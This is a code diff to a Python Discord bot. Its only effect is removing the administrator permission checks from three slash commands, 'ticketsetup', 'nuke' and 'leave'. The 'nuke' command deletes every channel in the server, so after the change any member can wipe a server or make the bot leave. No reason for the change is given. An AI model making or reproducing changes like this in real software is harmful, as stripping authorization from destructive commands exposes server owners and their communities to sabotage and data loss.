@@ -61,14 +61,12 @@ async def on_ready():
         print(e)
 
 @bot.tree.command(name="ticketsetup", description="Send the paid cleaning ticket panel")
-@app_checks.has_permissions(administrator=True) if 'app_checks' in globals() else app_commands.checks.has_permissions(administrator=True)
 async def ticketsetup(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
     view = TicketButton()
     await interaction.followup.send("Click the button below to open a ticket for **paid cleaning**:", view=view)
 
 @bot.tree.command(name="nuke", description="Delete every single channel in the server")
-@app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
     for channel in list(interaction.guild.channels):
@@ -78,7 +76,6 @@ async def nuke(interaction: discord.Interaction):
             print(f"Failed to delete channel {channel.name}: {e}")
 
 @bot.tree.command(name="leave", description="Make the bot leave the server")
-@app_commands.checks.has_permissions(administrator=True)
 async def leave(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
     await interaction.guild.leave()
